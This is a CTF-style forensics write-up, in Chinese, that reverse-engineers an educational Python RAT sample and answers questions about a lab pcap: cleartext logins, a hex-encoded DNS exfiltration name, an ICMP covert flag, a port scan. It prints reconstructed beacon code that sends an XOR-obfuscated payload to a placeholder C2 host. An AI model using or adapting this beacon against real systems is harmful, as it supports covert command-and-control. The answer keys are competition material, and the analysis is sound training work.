
# 獬豸杯（2——流量/逆向）
> 事先声明：仅供参考 我不知道正确答案，所以不包对哈，要是出错了 还请指出 感谢

## 检材基本信息

| 属性     | 值                                                                |
| ------ | ---------------------------------------------------------------- |
| 样本文件   | traffic_lab.pcap                                                 |
| SHA256 | 72024dcf0600555e04a10f44c24b73ce92d4cd48e88017b759c756bd3b0ce776 |
| 数据包总数  | 36                                                               |
| 捕获时间   | 2026-05-11 14:35:26.422017 +0800                                 |

| 属性     | 值                                                                |
| ------ | ---------------------------------------------------------------- |
| 样本文件   | EduRATSample.exe                                                 |
| SHA256 | 5f27954d73e5c030d970014560db0561c3138c72ef813dc43ce9deeb9b52a857 |
| PACKER | PyInstaller                                                      |

## 逆向部分
`python` 写的马 先反编译叭
```python
# Source Generated with Decompyle++
# File: edu_ratsample.pyc (Python 3.13)

Unsupported opcode: MAKE_FUNCTION (122)
import base64
import socket
import sys
import time
C2_HOST = '192.0.2.1'
C2_PORT = 64123
BEACON_B64 = 'eyJ0IjoiYmVhY29uIiwidiI6IjEuMCJ9'
MUTEX_NAME = 'Global\\EduLab_RAT_Mutex_2026'
USER_AGENT = 'Mozilla/5.0 (EduLab; Win32) RAT-Stub/1.0'
# WARNING: Decompyle incomplete
```
很遗憾，反编译结果有残缺 但是也拿到很多信息了接着来看字节码，`pycdas` 还是很人性化的

先关注有哪些函数
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615221456665.png)
嗯~一个异或不用管 一个构造`payload` 一个创建连接 一个`main
先来看`main`
```python
		[Disassembly]    
		    0       RESUME                          0
	        2       LOAD_CONST                      0: 0
	        4       LOAD_CONST                      1: None
	        6       IMPORT_NAME                     0: base64
	        8       STORE_NAME                      0: base64
	        10      LOAD_CONST                      0: 0
	        12      LOAD_CONST                      1: None
	        14      IMPORT_NAME                     1: socket
	        16      STORE_NAME                      1: socket
	        18      LOAD_CONST                      0: 0
	        20      LOAD_CONST                      1: None
	        22      IMPORT_NAME                     2: sys
	        24      STORE_NAME                      2: sys
	        26      LOAD_CONST                      0: 0
	        28      LOAD_CONST                      1: None
	        30      IMPORT_NAME                     3: time
	        32      STORE_NAME                      3: time
	        34      LOAD_CONST                      2: '192.0.2.1'
	        36      STORE_NAME                      4: C2_HOST
	        38      LOAD_CONST                      3: 64123
	        40      STORE_NAME                      5: C2_PORT
	        42      LOAD_CONST                      4: 'eyJ0IjoiYmVhY29uIiwidiI6IjEuMCJ9'
	        44      STORE_NAME                      6: BEACON_B64
	        46      LOAD_CONST                      5: 'Global\\EduLab_RAT_Mutex_2026'
	        48      STORE_NAME                      7: MUTEX_NAME
	        50      LOAD_CONST                      6: 'Mozilla/5.0 (EduLab; Win32) RAT-Stub/1.0'
	        52      STORE_NAME                      8: USER_AGENT
	        54      LOAD_CONST                      7: 'data'
	        56      LOAD_NAME                       9: bytes
	        58      LOAD_CONST                      8: 'key'
	        60      LOAD_NAME                       9: bytes
	        62      LOAD_CONST                      9: 'return'
	        64      LOAD_NAME                       9: bytes
	        66      BUILD_TUPLE                     6
	        68      LOAD_CONST                      10: <CODE> _xor
	        70      MAKE_FUNCTION
	        72      SET_FUNCTION_ATTRIBUTE          4 (MAKE_FUNCTION_ANNOTATIONS)
	        74      STORE_NAME                      10: _xor
	        76      LOAD_CONST                      9: 'return'
	        78      LOAD_NAME                       9: bytes
	        80      BUILD_TUPLE                     2
	        82      LOAD_CONST                      11: <CODE> build_payload
	        84      MAKE_FUNCTION
	        86      SET_FUNCTION_ATTRIBUTE          4 (MAKE_FUNCTION_ANNOTATIONS)
	        88      STORE_NAME                      11: build_payload
	        90      LOAD_CONST                      15: ('return', None)
	        92      LOAD_CONST                      12: <CODE> try_connect
	        94      MAKE_FUNCTION
	        96      SET_FUNCTION_ATTRIBUTE          4 (MAKE_FUNCTION_ANNOTATIONS)
	        98      STORE_NAME                      12: try_connect
	        100     LOAD_CONST                      9: 'return'
	        102     LOAD_NAME                       13: int
	        104     BUILD_TUPLE                     2
	        106     LOAD_CONST                      13: <CODE> main
	        108     MAKE_FUNCTION
	        110     SET_FUNCTION_ATTRIBUTE          4 (MAKE_FUNCTION_ANNOTATIONS)
	        112     STORE_NAME                      14: main
	        114     LOAD_NAME                       15: __name__
	        116     LOAD_CONST                      14: '__main__'
	        118     COMPARE_OP                      88 (==)
	        122     POP_JUMP_IF_FALSE               24 (to 172)
	        126     LOAD_NAME                       2: sys
	        128     LOAD_ATTR                       32: exit
	        148     PUSH_NULL
	        150     LOAD_NAME                       14: main
	        152     PUSH_NULL
	        154     CALL                            0
	        162     CALL                            1
	        170     POP_TOP
	        172     RETURN_CONST                    1: None
	        174     RETURN_CONST                    1: None
	    [Exception Table]
```
调一堆常量和函数 没了

接着看`build_payload`
```python
            [Disassembly]
                0       RESUME                          0
                2       LOAD_GLOBAL                     0: base64
                12      LOAD_ATTR                       2: b64decode
                32      PUSH_NULL
                34      LOAD_GLOBAL                     4: BEACON_B64
                44      CALL                            1
                52      STORE_FAST                      0: raw
                54      LOAD_CONST                      1: b'EDU'
                56      STORE_FAST                      1: key
                58      LOAD_GLOBAL                     7: NULL + _xor
                68      LOAD_FAST_LOAD_FAST             1: raw, key
                70      CALL                            2
                78      RETURN_VALUE
            [Exception Table]
```
先解码了`beacon` 存入`raw` 然后将`b'EDU'`存入`key` 然后 `key` 和 `raw` 异或

再来看最核心的函数`try_connect`
```python
			[Disassembly]
                0       RESUME                          0
                2       LOAD_GLOBAL                     1: NULL + build_payload
                12      CALL                            0
                20      STORE_FAST                      0: payload
                22      LOAD_GLOBAL                     2: socket
                32      LOAD_ATTR                       2: socket
                52      PUSH_NULL
                54      LOAD_GLOBAL                     2: socket
                64      LOAD_ATTR                       4: AF_INET
                84      LOAD_GLOBAL                     2: socket
                94      LOAD_ATTR                       6: SOCK_STREAM
                114     CALL                            2
                122     STORE_FAST                      1: s
                124     LOAD_FAST                       1: s
                126     LOAD_ATTR                       9: settimeout
                146     LOAD_CONST                      1: 3
                148     CALL                            1
                156     POP_TOP
                158     NOP
                160     LOAD_FAST                       1: s
                162     LOAD_ATTR                       11: connect
                182     LOAD_GLOBAL                     12: C2_HOST
                192     LOAD_GLOBAL                     14: C2_PORT
                202     BUILD_TUPLE                     2
                204     CALL                            1
                212     POP_TOP
                214     LOAD_FAST                       1: s
                216     LOAD_ATTR                       17: sendall
                236     LOAD_CONST                      2: b'UA:'
                238     LOAD_GLOBAL                     18: USER_AGENT
                248     LOAD_ATTR                       21: encode
                268     LOAD_CONST                      3: 'utf-8'
                270     CALL                            1
                278     BINARY_OP                       0 (+)
                282     LOAD_CONST                      4: b'\r\n'
                284     BINARY_OP                       0 (+)
                288     CALL                            1
                296     POP_TOP
                298     LOAD_FAST                       1: s
                300     LOAD_ATTR                       17: sendall
                320     LOAD_CONST                      5: b'PAYLOAD:'
                322     LOAD_FAST                       0: payload
                324     BINARY_OP                       0 (+)
                328     LOAD_CONST                      4: b'\r\n'
                330     BINARY_OP                       0 (+)
                334     CALL                            1
                342     POP_TOP
                344     LOAD_GLOBAL                     22: time
                354     LOAD_ATTR                       24: sleep
                374     PUSH_NULL
                376     LOAD_CONST                      6: 0.2
                378     CALL                            1
                386     POP_TOP
                388     LOAD_FAST                       1: s
                390     LOAD_ATTR                       29: close
                410     CALL                            0
                418     POP_TOP
                420     RETURN_CONST                    0: None
                422     PUSH_EXC_INFO
                424     LOAD_GLOBAL                     26: OSError
                434     CHECK_EXC_MATCH
                436     POP_JUMP_IF_FALSE               3 (to 444)
                440     POP_TOP
                442     POP_EXCEPT
                444     JUMP_BACKWARD_NO_INTERRUPT      29 (to 388)
                446     RERAISE                         0
                448     COPY                            3
                450     POP_EXCEPT
                452     RERAISE                         1
                454     PUSH_EXC_INFO
                456     LOAD_FAST                       1: s
                458     LOAD_ATTR                       29: close
                478     CALL                            0
                486     POP_TOP
                488     RERAISE                         0
                490     COPY                            3
                492     POP_EXCEPT
                494     RERAISE                         1
			[Exception Table]
```
先调用`build_payload`构造载荷存入`payload` 然后配置`socket` 设置超时 `HOST` `PORT` 然后用 `sendall` 发送`USER_AGENT+payload` 就..感觉..没什么意思？

来看看含deepseek还原的源码叭
```python
```python
import base64
import socket
import sys
import time

# ---- C2 配置 ----
C2_HOST = '192.0.2.1'      # 答案1: C2 IP地址 (RFC 5737 TEST-NET 占位地址)
C2_PORT = 64123             # 答案1: C2 端口号

# ---- Beacon 配置 ----
# Base64解码: {"t":"beacon","v":"1.0"}
BEACON_B64 = 'eyJ0IjoiYmVhY29uIiwidiI6IjEuMCJ9'  # 答案4

# ---- 单实例控制 ----
MUTEX_NAME = 'Global\\EduLab_RAT_Mutex_2026'        # 答案5

# ---- 网络指纹 ----
USER_AGENT = 'Mozilla/5.0 (EduLab; Win32) RAT-Stub/1.0'  # 答案3


def _xor(data: bytes, key: bytes) -> bytes:
    """
    XOR 加密/解密
    算法: data[i] ^ key[i % len(key)]
    密钥长度: 3 字节
    """
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def build_payload() -> bytes:
    """
    构造 Beacon 载荷:
    1. Base64 解码 BEACON_B64 → {"t":"beacon","v":"1.0"}
    2. XOR 加密 (密钥: b'EDU')
    """
    raw = base64.b64decode(BEACON_B64)
    key = b'EDU'
    return _xor(raw, key)


def try_connect():
    """
    C2 通信 (自定义 TCP 协议) — 答案2: 传输层协议为 TCP
    
    协议格式:
        UA: <USER_AGENT>\r\n
        PAYLOAD: <encrypted_beacon>\r\n
    
    流程: connect → sendall(UA) → sendall(PAYLOAD) → sleep(0.2) → close
    注意: 没有 s.recv() 调用，不接收任何 C2 命令，仅为单向 Beacon
    """
    payload = build_payload()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP socket
    s.settimeout(3.0)
    try:
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b'UA:' + USER_AGENT.encode('utf-8') + b'\r\n')
        s.sendall(b'PAYLOAD:' + payload + b'\r\n')
        time.sleep(0.2)
    except OSError:
        pass
    finally:
        s.close()


def main() -> int:
    """
    入口函数:
    1. 引用 MUTEX_NAME
    2. 调用 try_connect() 执行单次 Beacon
    3. 返回 0
    """
    _ = MUTEX_NAME
    try_connect()
    return 0


if __name__ == '__main__':
    sys.exit(main())
```
### 1.样本中的 C2 地址与端口分别是多少？【答案格式：127.0.0.1:8080】
见源码 `192.0.2.1:64123`
### 2.样本使用的传输层协议是什么？【答案格式：HTTP】（全大写）
`TCP` (创建`socket`连接然后直接`sendall`了)
### 3.样本外发的 User-Agent 完整字符串是什么？【按实际值填写】
见源码 `Mozilla/5.0 (EduLab; Win32) RAT-Stub/1.0`
### 4.Beacon 的 Base64 常量是什么？【按实际值填写】
见源码 `eyJ0IjoiYmVhY29uIiwidiI6IjEuMCJ9`
### 5.样本中出现的 Mutex 名称是什么？【按实际值填写】
见源码 `Global\\EduLab_RAT_Mutex_2026`
### 6.是否具备注册表 Run、计划任务、服务安装或 UAC 绕过等行为？
没有
### 7.该 exe 由何种方式打包？【答案格式：全大写】
 `PYINSTALLER`
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615214927431.png)

### 流量部分
> 更是水完了
### 1.内网用户向 intranet.corp.lab 提交登录表单。请给出 POST 正文里 password 字段的 解码后的提交值【按实际值填写】
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615223807798.png)
`LabPass#Q7`
### 2.客户端 10.10.10.50 向 DNS 10.10.10.53 发起一次查询。Queries 中的域名看似随机十六进制。请将该段十六进制视为 ASCII 的十六进制表示，还原出可读字符串（即解码后的域名语义）【答案格式：abc-abc.abc.abc】
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615223855142.png)
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615224101675.png)
`exalthread-drop.intranet.lab`
### 3.哪台客户端对哪台 FTP 服务器完成了认证？【答案格式：127.0.0.1-192.168.0.1】
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615224146776.png)
`10.10.10.50-10.10.10.101`
### 4.USER 与成功登录前的 PASS 明文分别是什么？【答案格式：USER-PASS 例：admin-123456】
接上图 `bob-Ftp_S3cret_9z`
### 5.存在来自外网段地址对 10.10.10.50 的 ICMP Echo 请求。请提取 ICMP 数据部分中隐藏的完整FLAG。【答案格式：ICMP_COVERT_FLAG{123_abc_def}】
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615224301316.png)
`ICMP_COVERT_FLAG{ping_payload_stego}`
### 6.对 api.corp.lab 的 GET /api/me 请求返回 200。除 JSON 体外，响应中哪条 非标准 HTTP 头 泄露了高权限备份密钥？【答案格式：A-Admin-Admin】
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615224613690.png)
`X-Admin-Token`
### 7.同一源 IP 对主机 10.10.10.200 在短时间内向多个不同目的端口发送了仅含 SYN 的 TCP 报文，请写出源 IP。【答案格式：192.168.0.1】
![image.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/20260615224746962.png)
`198.51.100.66`
### 8.客户端通过 Telnet（端口 23） 连接 10.10.10.1。流中出现登录名与口令行。请给出登录名与完整口令FLAG（含题目中的FLAG格式）。【答案格式：用户名-FLAG】

![屏幕截图 2026-06-16 120552.png](https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-06-16%20120552.png)
`charlie-Telnet_PASS_FLAG{legacy_cleartext}`